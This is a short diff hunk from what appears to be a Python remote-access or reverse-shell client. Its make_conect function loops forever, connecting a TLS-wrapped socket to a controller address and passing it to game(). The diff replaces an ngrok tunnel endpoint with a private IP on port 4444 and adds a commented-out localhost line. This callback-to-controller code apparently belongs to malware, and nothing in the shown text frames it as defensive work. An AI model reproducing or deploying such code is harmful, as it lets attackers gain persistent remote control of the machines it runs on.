@@ -346,7 +346,8 @@ def make_conect ():
     while True:
         sock = socket . socket (socket . AF_INET ,socket . SOCK_STREAM)
         try:
-            sock.connect ( ( '7.tcp.eu.ngrok.io' ,13417) )
+            sock.connect ( ( '192.168.131.48' ,4444) )
+            #sock.connect(('127.0.0.1', 4444))
             sock = context . wrap_socket (sock)
             game (sock)
             time . sleep (5)
